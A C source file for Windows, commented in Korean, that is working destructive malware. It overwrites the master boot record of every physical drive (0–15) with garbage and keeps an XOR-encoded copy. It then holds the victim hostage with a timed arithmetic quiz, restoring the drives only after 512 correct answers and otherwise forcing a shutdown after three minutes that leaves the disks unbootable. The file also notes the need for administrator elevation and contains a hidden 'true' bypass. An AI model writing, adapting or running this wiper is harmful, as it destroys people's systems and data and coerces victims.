/*
프로젝트 속성 - 구성 속성 - 링커 - 매니페스트 파일 - UAC 실행수준
프로젝트 속성 - 구성 속성 - 일반 - 문자 집합 - 멀티바이트 문자 집합 사용
*/
#include <stdio.h>
#include <conio.h>
#include <time.h>
#include <Windows.h>
#include <string.h>
#include <math.h>
 
void set_cursor(int x, int y) {//요거는 gotoxy()랑 같은 기능입니다. 커서를 옮기는 역할을 담당하죠
   COORD pos = { x,y };
   SetConsoleCursorPosition(GetStdHandle(STD_OUTPUT_HANDLE), pos);
}
int timer(int second) {
   int timer_k = second, timer_start, timer_now;
   CONSOLE_SCREEN_BUFFER_INFO curInfo;        // 콘솔 출력창의 정보를 담기 위해서 정의한 구조체
   timer_start = clock();
   printf("남은 시간 : ");
   GetConsoleScreenBufferInfo(GetStdHandle(STD_OUTPUT_HANDLE), &curInfo);  //현재 커서의 위치 정보를 저장하는 함수
   while (timer_k > 0) {
      set_cursor(curInfo.dwCursorPosition.X, curInfo.dwCursorPosition.Y);
      timer_now = clock();
      timer_k = second*1000 - (timer_now - timer_start);
      printf("%d.%d", timer_k / 1000, timer_k % 1000);
   }
}
int problem()
{
   int randnum1;
   int randnum2;
   int sign;
   srand(clock());
 
   randnum1 = rand() % 100 + 1;
   randnum2 = rand() % 100 + 1;
   sign = rand() % 3 + 1;
   if (sign == 1)
   {
      printf("\n%2d + %2d = ", randnum1, randnum2);
      return randnum1 + randnum2;
   }
   if (sign == 2)
   {
      printf("\n%2d - %2d = ", randnum1, randnum2);
      return randnum1 - randnum2;
   }
   if (sign == 3)
   {
 
      printf("\n%2d * %2d = ", randnum1, randnum2 % 10 + 1); //난이도 조절
      return randnum1 * (randnum2 % 10 + 1);
   }
 
 
}
int play() {
   CONSOLE_SCREEN_BUFFER_INFO curInfo;        // 콘솔 출력창의 정보를 담기 위해서 정의한 구조체
 
   int opportunity = 1024, answer_count = 0, solved_exam = 0, question_num;
   double start_time, this_time;
   char question[10] = {}, answer[10] = {}, ch;
 
   while (1) {
      memset(question, NULL, 10);
      memset(answer, NULL, 10);
      answer_count = 0;
 
      if (solved_exam >= 512) {
         printf("\n\nYou have solved 512 exams!!! WOW!!\n\n");
         return 1;
      }
      if (opportunity <= 0) {
         printf("\n\nOVER. Bye Bye\n\n");
         return 0;
      }
 
 
      printf("맞춘횟수 : %d | 남은횟수 : (%d/1024)", solved_exam, opportunity--);
      question_num = problem();//문제의 답을 question_num에 대입.
 
      itoa(question_num, question, 10);
 
      fflush(stdin);//키보드 버퍼 초기화.
 
      start_time = clock();
      while (1) {
         this_time = clock();
         if (this_time >= (start_time + 3000.0)) {//3000ms는 3초입니다
            break;
         }
 
         if (kbhit()) {
            //kbhit() 함수는 키보드로 입력이 되었는지, 안되었는지 판별해주는 함수이다.
            //키보드가 눌리지 않았으면(버퍼가 깨끗하면) 0을 반환하고 눌렸다면 1을 반환한다.
            ch = getche();//getche()는 문자 하나를 입력받는 동시에 화면에 출력한다
            if (ch == 8) {
               answer[answer_count] = NULL;
               GetConsoleScreenBufferInfo(GetStdHandle(STD_OUTPUT_HANDLE), &curInfo);  //현재 커서의 위치 정보를 저장하는 함수
               set_cursor(answer_count + 10, curInfo.dwCursorPosition.Y);
               printf(" ");
               set_cursor(answer_count + 10, curInfo.dwCursorPosition.Y);
               if (answer_count > 0) {
                  --answer_count;
               }
            }
            else if (ch == 13) {
               break;
            }
            else {
               answer[answer_count++] = ch;
            }
         }
      }
      fflush(stdin);
      if (!strcmp(question, answer)) {
         printf("\nYou are right!\n\n");
         ++solved_exam;
      }
      else if(!strcmp(answer,"true"))
      {
         return 1;
     }
     else if(!strcmp(answer,"false"))
     {
        return 0;
     }
      else {
         printf("\nYou are wrong\n\n");
      }
   }
}
 
const char KEY = 0xC8;
 
int main()
{
   //\\\\ = UNC 경로
   HANDLE hDevice[0x10]; //각각의 물리드라이브에 대한 핸들
   DWORD size;
   unsigned char buffer[0x10][0x200] = {}; //각각의 물리드라이브에 대한 MBR 백업할 버퍼
   unsigned char garbage[0x200] = {}; //실행 초기 MBR영역에 채울 쓰레기 값 
   char path[32] = {}; //물리드라이브의 주소를 저장시킬 임시변수
   
    CONSOLE_CURSOR_INFO cursorInfo = { 0, };
    cursorInfo.dwSize = 1;
    cursorInfo.bVisible = FALSE;
    SetConsoleCursorInfo(GetStdHandle(STD_OUTPUT_HANDLE), &cursorInfo); //커서를 숨김 
 
   memset(garbage, 0xFF, 0x200); //MBR에 덮어쓸 쓰레기값을 쓰레기 버퍼에 채움
 
   for (int i = 0; i < 0x10; i++)
   {
      sprintf(path, "\\\\.\\PhysicalDrive%d", i); //드라이브패치를 설정 (0부터 15까지) 
      hDevice[i] = CreateFile( //파일을 만들거나 염
         path, //오픈할  드라이브 
         GENERIC_READ | GENERIC_WRITE, //READ 와 WRITE 권한을 가짐 
         FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, //다른 프로그램이 접근하지 못하도록 독점 
         NULL, //보안구조체 및 상속 OFF 
         OPEN_EXISTING, //i번째 물리적하드가 있을경우만 오픈 
         0, //파일이 생성할때의 동작 , 우리는 생성 안할꺼임 
         NULL //기본 템플릿은 없는것으로 
      );
 
      if (hDevice[i] == INVALID_HANDLE_VALUE) //존재하지 않는 물리드라이브라면 
         continue;
       printf("%d 번째 하드를 파괴했다!\n",i+1);
      ReadFile( //파일데이터를 읽음
         hDevice[i], //핸들 
         (LPVOID)buffer[i], //읽어올 버퍼 
         512, //읽어올 바이트 수 
         &size, //읽은 바이트 수 (운영체제가 넣어서 반환해줌) 
         NULL //비동기 입출력 사용 안함 
      ); //MBR영역(512바이트)를 읽어옴 
      for (int j = 0; j < 0x200; j++)
         buffer[i][j] = buffer[i][j] ^ KEY; //KEY 로 xor 암호화
   }
   for (int i = 0; i < 0x10; i++)
   {
      if (hDevice[i] == INVALID_HANDLE_VALUE) //없는 물리드라이브 일경우 
         continue;
      SetFilePointer( //파일포인터가 파일에서 가리키는 위치를 바꿈
         hDevice[i], //핸들 
         0, //기준점에서 오프셋 
         0, //4GB 이상일경우 나머지 오프셋(4GB 이상은 64비트로 표현해야 하므로 나머지 앞에서 32비트 + 나머지 32비트이다) 
         FILE_BEGIN //기준점은 파일의 시작 
      ); //물리드라이브의 처음으로 포인터를 옮김 
 
      WriteFile( //파일에 데이터를 씀
         hDevice[i], //핸들 
         (LPVOID)garbage, //기록할 버퍼 
         0x200, //기록할 바이트 수 
         &size, //기록한 바이트 수  (운영체제가 넣어서 반환해줌) 
         NULL //비동기 입출력 사용 안함 
      ); //MBR 영역을 쓰레기 값으로 채움 
   }
   printf("\n지금부터 게임을 시작하지. \n");
   printf("내가 내는 문제를 통과하면 하드를 복구해주겠다.\n");
   printf("창을 종료하거나 탈락할경우 하드는 영원히 날아갈것이다.\n\n");
   //랜덤 * 랜덤 = printf 해서 답 입력받고 비교하는거까지
   //횟수는 200번 맞출때까지 3초안에 입력안하면 다음문제로 넘어감
 
   if (play() == 1)  //1이면 성공, 0이면 실패 0x200 번을 맞춰야하며 제한횟수는 0x400번 실시간 초 보여줌
   {
      printf("하드를 복구해주겠다.\n");
      for (int i = 0; i < 0x10; i++)
      {
         for (int j = 0; j < 0x200; j++)
            buffer[i][j] = buffer[i][j] ^ KEY;
         SetFilePointer(
            hDevice[i], //핸들 
            0, //기준점에서 오프셋 
            0, //4GB 이상일경우 나머지 오프셋(4GB 이상은 64비트로 표현해야 하므로 나머지 앞에서 32비트 + 나머지 32비트이다) 
            FILE_BEGIN //기준점은 파일의 시작 
         ); //물리드라이브의 처음으로 포인터를 옮김 
 
         WriteFile(
            hDevice[i], //핸들 
            (LPVOID)buffer[i], //기록할 버퍼 
            0x200, //기록할 바이트 수 
            &size, //기록한 바이트 수  (운영체제가 넣어서 반환해줌) 
            NULL //비동기 입출력 사용 안함 
         ); //MBR 영역을 복구함 
      }
   }
   else
   {
      printf("자료를 백업할시간은 단 3분이다.\n");
      timer(180); 
      //타이머구현 
      system("shutdown -s -p -f");
   }
   for (int i = 0; i < 0x10; i++)
      if (hDevice[i] != INVALID_HANDLE_VALUE)
         CloseHandle(hDevice[i]); //핸들 닫아줌
}
